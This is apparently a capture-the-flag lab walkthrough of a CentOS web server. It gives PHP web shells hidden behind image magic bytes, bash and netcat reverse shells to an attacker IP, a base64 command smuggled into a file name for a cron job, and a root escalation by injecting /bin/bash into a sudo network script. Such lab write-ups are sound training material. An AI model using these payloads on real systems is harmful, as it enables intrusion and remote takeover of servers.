- nmap shows port 80
	- **Also shows CentOS which is part of Red Hat, comes in important later**
- can use gobuster dir command with dirbuster wordlist
- dirsearch gives 2 links
	- /uploads
	- /backup
		- backup.tar
			- extract it and we find  index.php, upload.php, photos.php
			- each lead to a link
				- can upload at /upload.php
	- Searching the code :
		- we see lib.php does a mime file check.
		- we also see in upload.php that it does another check in the file name
		- Grep to aid you :
			```bash
grep -RI "$_" * # to see how a user interacts with a server
```
			- $_ is a superglobal variable. This is an easy way for user input to be passed into PHP.
				- So we want to see what can a user do?
			- we see `$_FILES` and a `POST:Submit` so we search in uploads.php and file the check file type function
				- we see a check_file_type() function which e can then grep to find which file
					```bash
grep check file*
```
					- lib.php which then shows the mime file check. (checks for any mime with "image/" in it) 
				- we can also see the two Invalid image type errors, one missing a period.
				- this can be a check to it passing either none or one of the 2 checks (magic bytes and filename)
					- so if the magic bytes arent changed we get a slightly different error message showing some progress
## Initial Foothold
- lib.php says theres a file check for mime types
	- **PentestMonkey quick method (What I did first):
		- we can abuse the png type by adding png magic bytes to the beggining on php file and adding .png at the end and then uploading it.
			- make sure the magic bytes dont overwrite the php reverse shell code
	- **Alternate way 1**
		- create and change magic bytes.
			```bash
echo "89 50 4E 47 0D 0A 1A 0A" | xxd -p -r > shell.php.png #magic bytes for png
```
			- Then add the code after the magic byte showing multiple working ones:
				```bash
<?php system($_REQUEST['cmd']); ?>
<?php system($_GET["rocknrj"]); ?>
```
			- Uploaded file should work
	- **Alternate2, BurpSuite, Preferred**
		- we try with gif here.
		- Can repeat what we did for png to find the text in gif (these numbers result in some text)
			- for gif it is
				```bash
GIF8;
```
		- we create shell.php again
		- intercept the upload
		- In BurpSuite: 
			- change the filename to shell.php.gif
			- edit content and add "GIF8;" at the start and forward the packet
			- forward it
		- Can see file is uploaded at photos.php and access it at /uploads/`<filename>` (filename is name we see at photos.php)
			- can add the following and a command (eg:whoami) to see i it works
				```bash
http://10.10.11.146/uploads/<filename>.php.gif?cmd=whoami
```
	- File upload should work for all these method and we can access it in the photos.php location on website.
	- **For Reverse Shell: All methods**
		- Have netcat lstening on desired port
		- **For pentest monkey Quick Method**
			- should work immediately after accessing file (right click the file at /photos.php and click Open in new tab)
		- **For Alternate 2 (Preferred):**
			- capture packet of accessing the file
			- enter this command where we put in whoami. then select it and press Ctrl+U to URL encode (shown at the second line below):
				```bash
Without URL Encoding:
bash -i >& /dev/tcp/10.10.14.25/9999 0>&1 #main command
OR
bach -c 'bash -i >& /dev/tcp/10.10.14.25/9999 0>&1'
--------
URL Encoded:
bash+-i+>%26+/dev/tcp/10.10.14.25/9999+0>%261 #url encoded
OR
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.25/9999+0>%261'
```
			- This URL encoded code can be forwarded/ sent by repeater.
		- **For Alternate 1**
			- can use browser to execute commands as stated earlier.
				- try to execute the reverse shell exploit
					- but we need to url encode 
						- can use burp suite 
			- can use curl:
				```bash
curl -G --data-urlencode "cmd=bash -i >& /dev/tcp/10.10.14.25/9999 0>&1" http://10.10.10.146/uploads/10_10_14_25.php.gif

# Or can include the one with bach -c included
```
## Lateral movement for user.txt
- Get better shell :
	- Method 1 :
		```bash
script /dev/null -c bash
```
	- Method 2 ( didn't work for me): 
		```bash
target>$ python -c ‘import pty;pty.spawn(“/bin/bash”)’;
Ctrl+Z # to background it and exit from shell to local machine
local>$ stty raw -echo

Press fg > Enter
Should get shell

```
- reading cron file we see a file is executed every 3 minutes
- reading check_attack.php
	```bash
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```
	- we see it takes a user input $value which is the page name
		- why value? on checking all variables, thats the only one not defined in code.
		- we know as if value is index.php it returns true
	- **Note: we can check if we can edit lib.php. We can't but if we could, we could direct the first line to our php exploit and it would execute it**
		- we know as if value is index.php it returns true
	- this command is then used here:
		```bash
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```
		- uses exec which passes it(**DANGEROUS like system command**) `[FIX is should use unlink instead]`
		- value is not sanitized and so if we create a special file type it passes it as a command
		- yet we cannot use / like how we obtianed out first reverse shell (url) as this is a file we are creating
			- so we can encode our usual exploit in base64 OR
			- use nc exploit
- add reverse shell script as file :
	- create files in /var/www/html/uploads (thats the path in our attack code)
	- listen on required port on local machine:
	- Method 1:
		- encoded in base 64 as file name with echo command :
			```bash
echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.25/9999 0>&1'" | base64 
cd /var/www/html/uploads
touch -- ';echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNS85OTk5IDA+JjEn | base64 -d | bash'
```
		- after 3ish minutes we should get shell as guly at netcat listener
		- -- in touch is to say no arguments, just start writing filename
	- Method 2:
		- create netcat file :
			```bash
touch -- ';nc -c bash 10.10.14.25 9999';
```
	- we gain user guly shell.
------
## Privilege Escalation
- We pass:
	```bash
sudo -l
```
	- and find:
		```bash	
- /usrlocal/sbin/changename.sh
```
	- We read it:
		```bash
ls -la /usr/local/sbin/changename.sh # we find we can't modify it, and owned by root
cat /usr/local/sbin/changename.sh

---OUTPUT---
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```
		- Creates a network script.
		- has regular expressions listed ("\ " implies space included)
		- code asks to enter name
			- if its NOT somewhat equal to regular expression, say it's wrong input, else print out the interface name.
		- then copies details to the file and does ifup on it.
- **This is the hard part, finding the exploit**
	- we could search on google some of the following.. **Key note is use "fulldisclosure" as thats a good website, maybe seclists too considering the link**
		- network scripts red hat linux command inject (2 option in search)
		- centos network scripts rce fulldisclosure (2 option)
		- centos network scripts rce fulldisclosure (1st option)
	- we find a url:
		https://seclists.org/fulldisclosure/2019/Apr/24
		- **can execute command after adding space**
- We run the command :
	```bash
sudo /usr/local/sbin/changename.sh
```
	- Add any input for each and for one of them add a space and put /bin/bash
		```bash
whoami
> guly
sudo /usr/local/sbin/changename.sh
> interface NAME:
> rocknrj
> interface PROXY_METHOD:              
> rocknrj /bin/bash                 # INJECTING HERE(CAN BE ANY OTHER INPUT TOO)
> interface BROWSER_ONLY:
> rocknrj
> interface BOOTPROTO:
> rocknrj
whoami
> root
```
- we enter as root